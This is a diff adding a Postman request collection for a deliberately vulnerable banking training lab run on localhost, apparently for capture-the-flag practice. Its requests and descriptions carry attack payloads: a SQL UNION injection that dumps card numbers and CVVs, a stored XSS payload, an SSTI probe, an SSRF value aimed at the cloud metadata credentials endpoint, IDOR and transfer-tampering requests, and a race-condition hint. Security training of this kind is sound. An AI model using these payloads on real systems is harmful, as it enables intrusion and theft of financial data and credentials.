@@ -1,0 +1,643 @@
+{
+  "info": {
+    "name": "NDBVB — OnlineBank (vulnerable lab)",
+    "_postman_id": "b1a7c0de-0000-4000-8000-0nlinebank1",
+    "description": "Requests for NDBVB (not damn but vulnerable bank): the OnlineBank training stand. Set {{base_url}} (default http://localhost:9080) and {{token}} after login. Flags and walkthroughs: docs/SOLUTIONS.md.",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+  },
+  "variable": [
+    {
+      "key": "base_url",
+      "value": "http://localhost:9080"
+    },
+    {
+      "key": "token",
+      "value": ""
+    },
+    {
+      "key": "challenge_id",
+      "value": ""
+    }
+  ],
+  "item": [
+    {
+      "name": "Auth",
+      "item": [
+        {
+          "name": "Login (step 1: password)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": "{{base_url}}/api/v1/auth/login",
+            "body": {
+              "mode": "raw",
+              "raw": "{\"login\":\"ama@onlinebank.app\",\"password\":\"OnlineBank!123\"}"
+            }
+          }
+        },
+        {
+          "name": "Verify OTP (step 2)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": "{{base_url}}/api/v1/auth/verify-otp",
+            "body": {
+              "mode": "raw",
+              "raw": "{\"challenge_id\":\"{{challenge_id}}\",\"code\":\"0000\"}"
+            },
+            "description": "Add \"phone\":\"+233501234567\" to verify with a code delivered to another phone (AUTH-2)."
+          }
+        },
+        {
+          "name": "Request OTP again (flood)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": "{{base_url}}/api/v1/auth/request-otp",
+            "body": {
+              "mode": "raw",
+              "raw": "{\"login\":\"ama@onlinebank.app\",\"password\":\"OnlineBank!123\"}"
+            }
+          }
+        },
+        {
+          "name": "JWKS (public key)",
+          "request": {
+            "method": "GET",
+            "url": "{{base_url}}/api/v1/auth/jwks.json"
+          }
+        },
+        {
+          "name": "Change password (no revocation)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token}}"
+              }
+            ],
+            "url": "{{base_url}}/api/v1/auth/change-password",
+            "body": {
+              "mode": "raw",
+              "raw": "{\"old_password\":\"OnlineBank!123\",\"new_password\":\"OnlineBank!456\"}"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "name": "Accounts & statements",
+      "item": [
+        {
+          "name": "My accounts",
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token}}"
+              }
+            ],
+            "url": "{{base_url}}/api/v1/accounts"
+          }
+        },
+        {
+          "name": "Account details (IDOR)",
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token}}"
+              }
+            ],
+            "url": "{{base_url}}/api/v1/accounts/1004"
+          }
+        },
+        {
+          "name": "Balance (IDOR)",
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token}}"
+              }
+            ],
+            "url": "{{base_url}}/api/v1/accounts/1004/balance"
+          }
+        },
+        {
+          "name": "Transactions + search (SQLi)",
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token}}"
+              }
+            ],
+            "url": "{{base_url}}/api/v1/accounts/1001/transactions?search=&sort=ts%20DESC"
+          },
+          "description": "UNION payload: search=') UNION SELECT id, NULL::timestamptz, pan, NULL::float8, cvv, holder, note, 'leak' FROM cards--"
+        },
+        {
+          "name": "Import XML statement (XXE)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token}}"
+              }
+            ],
+            "url": "{{base_url}}/api/v1/statements/import",
+            "body": {
+              "mode": "formdata",
+              "formdata": [
+                {
+                  "key": "file",
+                  "type": "file",
+                  "src": "statement.xml"
+                }
+              ]
+            }
+          }
+        }
+      ]
+    },
+    {
+      "name": "Transfers & exchange",
+      "item": [
+        {
+          "name": "Transfer (foreign from_account / notations)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token}}"
+              }
+            ],
+            "url": "{{base_url}}/api/v1/transfers",
+            "body": {
+              "mode": "raw",
+              "raw": "{\"from_account\":1004,\"to_account\":1001,\"amount\":\"100.00\",\"description\":\"rent\"}"
+            }
+          },
+          "description": "Try amount 0x64, 1e2, +50, -50, 1e-9. Change from_account freely (AC-2)."
+        },
+        {
+          "name": "Beneficiaries (dead end)",
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token}}"
+              }
+            ],
+            "url": "{{base_url}}/api/v1/transfers/beneficiaries"
+          }
+        },
+        {
+          "name": "Exchange rate",
+          "request": {
+            "method": "GET",
+            "url": "{{base_url}}/api/v1/exchange/rate?from_cur=USD&to_cur=GHS"
+          }
+        },
+        {
+          "name": "Convert (race target)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token}}"
+              }
+            ],
+            "url": "{{base_url}}/api/v1/exchange/convert",
+            "body": {
+              "mode": "raw",
+              "raw": "{\"account_id\":1001,\"to_currency\":\"GHS\",\"amount\":\"600\"}"
+            },
+            "description": "Send a group in parallel (single packet) to trigger BIZ-1."
+          }
+        }
+      ]
+    },
+    {
+      "name": "Cards & cashback",
+      "item": [
+        {
+          "name": "My cards (full PAN)",
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token}}"
+              }
+            ],
+            "url": "{{base_url}}/api/v1/cards"
+          }
+        },
+        {
+          "name": "Card details (IDOR + note)",
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token}}"
+              }
+            ],
+            "url": "{{base_url}}/api/v1/cards/3"
+          }
+        },
+        {
+          "name": "Freeze (dead end: checks owner)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token}}"
+              }
+            ],
+            "url": "{{base_url}}/api/v1/cards/4/freeze"
+          }
+        },
+        {
+          "name": "Cashback campaigns",
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token}}"
+              }
+            ],
+            "url": "{{base_url}}/api/v1/cashback/campaigns"
+          }
+        },
+        {
+          "name": "Activate campaign (any id, stackable)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token}}"
+              }
+            ],
+            "url": "{{base_url}}/api/v1/cashback/campaigns/4/activate"
+          }
+        },
+        {
+          "name": "Settle (shadow hook)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token}}"
+              }
+            ],
+            "url": "{{base_url}}/api/v1/cashback/settle"
+          }
+        }
+      ]
+    },
+    {
+      "name": "Profile & webhooks",
+      "item": [
+        {
+          "name": "Get profile",
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token}}"
+              }
+            ],
+            "url": "{{base_url}}/api/v1/profile"
+          }
+        },
+        {
+          "name": "Patch profile (mass assignment / SSTI)",
+          "request": {
+            "method": "PATCH",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token}}"
+              }
+            ],
+            "url": "{{base_url}}/api/v1/profile",
+            "body": {
+              "mode": "raw",
+              "raw": "{\"first_name\":\"Amara\"}"
+            }
+          },
+          "description": "Add \"is_backoffice\":true or set first_name to {{7*7}}."
+        },
+        {
+          "name": "Notifications (SSTI output)",
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token}}"
+              }
+            ],
+            "url": "{{base_url}}/api/v1/profile/notifications"
+          }
+        },
+        {
+          "name": "Avatar photo upload (SSRF via source)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token}}"
+              }
+            ],
+            "url": "{{base_url}}/api/v1/profile/avatar",
+            "body": {
+              "mode": "formdata",
+              "formdata": [
+                {
+                  "key": "file",
+                  "type": "file",
+                  "src": "avatar.png"
+                },
+                {
+                  "key": "source",
+                  "type": "text",
+                  "value": "http://169.254.169.254/latest/meta-data/iam/security-credentials/onlinebank-prod-role",
+                  "disabled": true
+                }
+              ]
+            }
+          }
+        },
+        {
+          "name": "KYC upload (unrestricted)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token}}"
+              }
+            ],
+            "url": "{{base_url}}/api/v1/profile/kyc",
+            "body": {
+              "mode": "formdata",
+              "formdata": [
+                {
+                  "key": "file",
+                  "type": "file",
+                  "src": "kyc.svg"
+                }
+              ]
+            }
+          }
+        },
+        {
+          "name": "Webhooks list",
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token}}"
+              }
+            ],
+            "url": "{{base_url}}/api/v1/webhooks"
+          }
+        },
+        {
+          "name": "Webhook test (SSRF body preview)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token}}"
+              }
+            ],
+            "url": "{{base_url}}/api/v1/webhooks/1/test"
+          }
+        }
+      ]
+    },
+    {
+      "name": "Support & admin",
+      "item": [
+        {
+          "name": "Create ticket (stored XSS)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token}}"
+              }
+            ],
+            "url": "{{base_url}}/api/v1/support/tickets",
+            "body": {
+              "mode": "raw",
+              "raw": "{\"subject\":\"Help\",\"message\":\"Please review <img src=x onerror=alert(1)>\"}"
+            }
+          }
+        },
+        {
+          "name": "Close ticket (BFLA)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token}}"
+              }
+            ],
+            "url": "{{base_url}}/api/v1/support/tickets/1/close"
+          }
+        },
+        {
+          "name": "Delete KYC doc (BFLA)",
+          "request": {
+            "method": "DELETE",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token}}"
+              }
+            ],
+            "url": "{{base_url}}/api/v1/support/kyc/1"
+          }
+        },
+        {
+          "name": "Admin customers (BFLA)",
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token}}"
+              }
+            ],
+            "url": "{{base_url}}/api/v1/admin/customers"
+          }
+        },
+        {
+          "name": "Admin flag (needs backoffice)",
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token}}"
+              }
+            ],
+            "url": "{{base_url}}/api/v1/admin/flag"
+          }
+        },
+        {
+          "name": "Audit log (dead end: 403)",
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token}}"
+              }
+            ],
+            "url": "{{base_url}}/api/v1/admin/audit-log"
+          }
+        }
+      ]
+    },
+    {
+      "name": "GraphQL & shadow",
+      "item": [
+        {
+          "name": "GraphQL user query",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": "{{base_url}}/api/v1/graphql",
+            "body": {
+              "mode": "raw",
+              "raw": "{\"query\":\"{ user(id:5){ login phone secretNote cards { pan cvv } } }\"}"
+            }
+          }
+        },
+        {
+          "name": "Debug users (shadow)",
+          "request": {
+            "method": "GET",
+            "url": "{{base_url}}/api/v0/debug/users"
+          }
+        },
+        {
+          "name": "Debug config (JWT secret + flag)",
+          "request": {
+            "method": "GET",
+            "url": "{{base_url}}/api/v0/debug/config"
+          }
+        },
+        {
+          "name": "Debug reset",
+          "request": {
+            "method": "POST",
+            "url": "{{base_url}}/api/v0/debug/reset"
+          }
+        }
+      ]
+    },
+    {
+      "name": "Progress",
+      "item": [
+        {
+          "name": "Challenges",
+          "request": {
+            "method": "GET",
+            "url": "{{base_url}}/api/v1/progress/challenges"
+          }
+        },
+        {
+          "name": "Submit flag",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": "{{base_url}}/api/v1/progress/submit",
+            "body": {
+              "mode": "raw",
+              "raw": "{\"nickname\":\"your_nick\",\"flag\":\"FLAG{...}\"}"
+            }
+          }
+        },
+        {
+          "name": "Board",
+          "request": {
+            "method": "GET",
+            "url": "{{base_url}}/api/v1/progress/state"
+          }
+        }
+      ]
+    }
+  ]
+}
